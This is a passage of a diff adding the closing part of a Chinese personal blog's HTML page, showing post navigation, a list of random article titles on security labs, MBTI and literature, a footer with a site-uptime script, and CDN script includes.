+    <a href="/books/XIAODI/" rel="section"><i class="ic i-opera"></i>XIAODI-SAFE</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2022/12/30/SAFE/14%20%E6%89%93%E7%A0%B4%E5%B8%B8%E8%A7%84/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2022/12/30/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2023/04/01/MBTI/INFJ%E7%9A%84%E7%88%B1%E6%83%85%E8%A7%82/" title="INFJ的爱情观">INFJ的爱情观</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
+</div>
+
+    <span><a href="/2023/05/19/SAFE/Linux/" title="Linux 命令">Linux 命令</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2021/11/01/VULNHUB/145%20TORANDO/" title="VULNHUB TORANDO">VULNHUB TORANDO</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2019/07/01/BOOK/6%E3%80%8A%E8%AE%BA%E4%B8%8A%E5%B8%9D%E7%9A%84%E9%9A%90%E7%A7%98%E3%80%8B%E5%BA%93%E6%92%92%C2%B7%E5%B0%BC%E5%8F%A4%E6%8B%89/" title="《论上帝的隐秘》库撒·尼古拉">《论上帝的隐秘》库撒·尼古拉</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2019/07/01/BOOK/23%E3%80%8A%E7%8E%B0%E5%AE%9E%E4%B8%80%E7%A7%8D%E3%80%8B%E4%BD%99%E5%8D%8E/" title="《现实一种》余华">《现实一种》余华</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2019/07/01/BOOK/3%E3%80%8A%E5%B9%B3%E5%87%A1%E7%9A%84%E4%B8%96%E7%95%8C%E3%80%8B%E8%B7%AF%E9%81%A5/" title="《平凡的世界》路遥">《平凡的世界》路遥</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
+</div>
+
+    <span><a href="/2022/12/30/SAFE/5%20APP%E6%94%BB%E9%98%B2/" title="XD22 5 APP 攻防">XD22 5 APP 攻防</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2021/11/01/VULNHUB/110%20RED/" title="VULNHUB 10 RED">VULNHUB 10 RED</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2020/04/01/MBTI/ISTJ%E8%A7%A3%E8%AF%BB/" title="ISTJ解读">ISTJ解读</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2021/11/01/VULNHUB/139%20INFERNO/" title="VULNHUB INFERNO">VULNHUB INFERNO</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">.N1h1l157 @ Phut Hon</span>
+  </div>
+
+<!--   自定义开启一个网站的运行时间 -->
+  <div class="site-uptime">
+    Site uptime: <span id="site-uptime"></span>
+  </div>
+  <script>
+    var siteUptimeElement = document.getElementById('site-uptime');
+    var siteSetupDate = new Date('2023-03-18'); // 替换为您的网站具体创建日期，格式为 'YYYY-MM-DD'
+    setInterval(function() {
+      var currentTime = new Date();
+      var uptime = formatUptime(currentTime - siteSetupDate);
+      siteUptimeElement.textContent = uptime;
+    }, 1000);
+
+    function formatUptime(milliseconds) {
+      var seconds = Math.floor(milliseconds / 1000);
+      var minutes = Math.floor(seconds / 60);
+      var hours = Math.floor(minutes / 60);
+      var days = Math.floor(hours / 24);
+
+      var uptime = '';
+      if (days > 0) {
+        uptime += days + '天 ';
+      }
+      if (hours > 0) {
+        uptime += (hours % 24) + '时 ';
+      }
+      if (minutes > 0) {
+        uptime += (minutes % 60) + '分 ';
+      }
+      uptime += (seconds % 60) + '秒';
+
+      return uptime;
+    }
+  </script>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2022/12/30/SAFE/13 补充知识/',
+    favicon: {
+      show: "Cryp71c3",
+      hide: "十年磨一剑"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
